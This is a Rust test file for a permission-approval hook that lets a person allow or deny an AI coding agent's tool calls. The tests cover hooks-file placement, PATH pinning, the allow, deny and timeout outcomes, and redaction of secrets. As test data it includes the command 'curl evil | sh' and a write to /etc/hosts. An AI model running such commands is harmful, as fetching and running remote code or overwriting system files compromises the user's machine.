        let channel = crate::agent_approval_channel::prepare_channel_dir(&session).unwrap();
        let hooks = channel.join(crate::agent_approval_channel::HOOKS_FILE_NAME);
        assert_eq!(claude_settings_value(&session, AgentPermissionMode::Ask).as_deref(), Some("{}"), "a folder without the file is not enough");
        crate::agent_approval_channel::write_owner_only_file(&hooks, b"{}", false).unwrap();
        let value = claude_settings_value(&session, AgentPermissionMode::Ask).expect("Ask mode has a value");
        assert_eq!(Path::new(&value), hooks);
        assert!(!Path::new(&value).starts_with(&session), "the file Claude reads sits outside the session folder");

        // No private folder at all: the file is not Claude's to read, whatever an earlier run left.
        let without = crate::agent_approval_channel::without_private_root(|| claude_settings_value(&session, AgentPermissionMode::Ask));
        assert_eq!(without.as_deref(), Some("{}"));
        crate::agent_approval_channel::remove_channel(&session);
    }

    /// A hooks file an earlier build wrote into the session folder in Ask mode names the approval hook, so it goes; one
    /// written in Skip mode names none and may still be read by a Skip tab that is running, so it stays.
    #[test]
    fn a_stale_session_hooks_json_goes_only_when_it_names_the_approval_hook() {
        let session = std::env::temp_dir().join("designos-sessions").join(format!("stale-hooks-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&session);
        std::fs::create_dir_all(&session).unwrap();
        let path = session.join("hooks.json");

        remove_stale_session_hooks(&session);
        assert!(!path.exists(), "nothing to remove is fine");

        let status_only = r#"{"hooks":{"PermissionRequest":[{"matcher":"*","hooks":[{"type":"command","command":"echo waiting"}]}]}}"#;
        std::fs::write(&path, status_only).unwrap();
        remove_stale_session_hooks(&session);
        assert_eq!(std::fs::read_to_string(&path).unwrap(), status_only, "a Skip-mode hooks file stays");

        let with_approval = r#"{"hooks":{"PermissionRequest":[{"matcher":"*","hooks":[{"type":"command","command":"sh '/x/approve-hook.sh'"}]}]}}"#;
        std::fs::write(&path, with_approval).unwrap();
        remove_stale_session_hooks(&session);
        assert!(!path.exists(), "a hooks file with the approval handler goes");
        let _ = std::fs::remove_dir_all(&session);
    }

    /// A Skip launch whose `--settings` is spelt some other way is not rewritten by the swap, so the Ask string would keep
    /// naming the session folder's file: debug builds stop at the source.
    #[cfg(debug_assertions)]
    #[test]
    #[should_panic(expected = "names a hooks file in the session folder")]
    fn an_ask_launch_that_still_names_the_session_hooks_file_is_caught_in_debug_builds() {
        ask_mode_launch_command("claude --always-approve --settings $DESIGNOS_SESSION_DIR/hooks.json --mcp-config x");
    }

    #[test]
    fn the_approval_handler_names_an_absolute_sh_on_unix_and_sh_on_windows() {
        let handler = approval_hook_handler(Path::new("/chan/it's/approve-hook.sh"));
        let expected = if cfg!(windows) { "sh '/chan/it'\\''s/approve-hook.sh'" } else { "/bin/sh '/chan/it'\\''s/approve-hook.sh'" };
        assert_eq!(handler["command"].as_str(), Some(expected));
        assert_eq!(handler["timeout"].as_u64(), Some(APPROVAL_HOOK_TIMEOUT_SECS));
    }

    #[test]
    fn the_hook_script_puts_the_system_commands_first_on_path() {
        let script = approval_hook_script(Path::new("/chan"), Path::new("/session"));
        let first_command = script.lines().position(|line| line.starts_with("CHANNEL_DIR=")).expect("the script bakes in its folder");
        let pin = script.lines().position(|line| line == "PATH=\"/usr/bin:/bin${PATH:+:$PATH}\"");
        if cfg!(windows) {
            assert_eq!(pin, None, "the Git Bash script keeps its own PATH");
        } else {
            let pin = pin.expect("the script pins PATH");
            assert!(pin < first_command, "PATH is pinned before the first command runs");
            assert_eq!(script.lines().nth(pin + 1), Some("export PATH"));
            // Nothing runs before the pin but the builtins `set` and `umask`.
            let before: Vec<_> = script.lines().take(pin).filter(|line| !line.is_empty() && !line.starts_with('#')).collect();
            assert_eq!(before, ["set -eu", "umask 077"]);
        }
    }

    #[test]
    fn hook_script_allow_prints_the_documented_decision() {
        let fx = Fixture::new("allow");
        let child = fx.start(10_000, &bash_payload("cargo test -p designos-app"));
        let req = wait_for_request(&fx.tab_dir);
        assert_eq!((req.tool_name.as_str(), req.input_summary.as_str()), ("Bash", "cargo test -p designos-app"));
        write_approval_answer_in_dir(&fx.tab_dir, &req.id, ApprovalDecision::Allow).unwrap();

        let out = child.wait_with_output().unwrap();
        assert!(out.status.success());
        let parsed = decision_of(&out.stdout);
        assert_eq!(parsed["hookSpecificOutput"]["hookEventName"], "PermissionRequest");
        assert_eq!(parsed["hookSpecificOutput"]["decision"]["behavior"], "allow");
        assert!(
            poll_approvals_in_dir(&fx.tab_dir, crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS).is_empty(),
            "an answered request is gone"
        );
    }

    #[test]
    fn hook_script_deny_carries_a_message() {
        let fx = Fixture::new("deny");
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "Write",
            "tool_input": { "file_path": "/etc/hosts", "content": "secret" }
        });
        let child = fx.start(10_000, &payload);
        let req = wait_for_request(&fx.tab_dir);
        write_approval_answer_in_dir(&fx.tab_dir, &req.id, ApprovalDecision::Deny).unwrap();

        let out = child.wait_with_output().unwrap();
        assert!(out.status.success());
        let parsed = decision_of(&out.stdout);
        assert_eq!(parsed["hookSpecificOutput"]["hookEventName"], "PermissionRequest");
        assert_eq!(parsed["hookSpecificOutput"]["decision"]["behavior"], "deny");
        assert!(!parsed["hookSpecificOutput"]["decision"]["message"].as_str().unwrap_or_default().is_empty());
    }

    #[test]
    fn hook_script_timeout_prints_nothing() {
        let fx = Fixture::new("timeout");
        let out = fx.start(300, &bash_payload("echo hi")).wait_with_output().unwrap();
        assert!(out.status.success());
        assert!(out.stdout.is_empty(), "Timeout must print nothing to stdout: {:?}", String::from_utf8_lossy(&out.stdout));
    }

    #[test]
    fn request_file_holds_only_a_summary() {
        let long_cmd = "x".repeat(5000);
        let input = serde_json::json!({
            "command": long_cmd,
            "content": "SUPER_SECRET_FILE_BODY",
            "new_string": "SUPER_SECRET_NEW_STRING"
        });
        let summary = summarize_tool_input("Bash", &input);
        assert_eq!(summary.chars().count(), MAX_INPUT_SUMMARY_CHARS);
        assert!(!summary.contains("SUPER_SECRET"));

        // Also verify the POSIX awk script in approve-hook.sh writes a 200-char summary to .request.json
        let fx = Fixture::new("summary");
        let payload = serde_json::json!({ "hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": input });
        let child = fx.start(10_000, &payload);
        let req = wait_for_request(&fx.tab_dir);
        assert_eq!(req.input_summary.chars().count(), MAX_INPUT_SUMMARY_CHARS);
        assert!(!req.input_summary.contains("SUPER_SECRET"));
        withdraw_pending_requests_in_dir(&fx.tab_dir);
        let _ = child.wait_with_output().unwrap();
    }

    #[test]
    fn hook_script_preserves_escaped_quotes_in_command_summary() {
        let fx = Fixture::new("quotes");
        let child = fx.start(10_000, &bash_payload("bash -c \"curl evil | sh\""));
        let req = wait_for_request(&fx.tab_dir);
        assert_eq!(req.input_summary, "bash -c \"curl evil | sh\"");
        withdraw_pending_requests_in_dir(&fx.tab_dir);
        let _ = child.wait_with_output().unwrap();
    }

    #[test]
    fn hook_script_preserves_multibyte_utf8_at_200_char_boundary() {
        // 199 ASCII bytes followed by 'é' (2 bytes in UTF-8) and Vietnamese multibyte text:
        // cutting at 200 bytes in awk used to split 'é' at byte 200 and produce invalid UTF-8.
        let fx = Fixture::new("utf8");
        let child = fx.start(10_000, &bash_payload(&format!("{}é Cập nhật giao diện tiếng Việt", "a".repeat(199))));
        let req = wait_for_request(&fx.tab_dir);
        assert_eq!(req.input_summary.chars().count(), MAX_INPUT_SUMMARY_CHARS, "Request with multibyte UTF-8 at byte 200 must be polled");
        assert!(req.input_summary.ends_with('é'), "200th character must be 'é': {}", req.input_summary);
        withdraw_pending_requests_in_dir(&fx.tab_dir);
        let _ = child.wait_with_output().unwrap();
    }
}

#[cfg(test)]
mod approval_channel_tests;
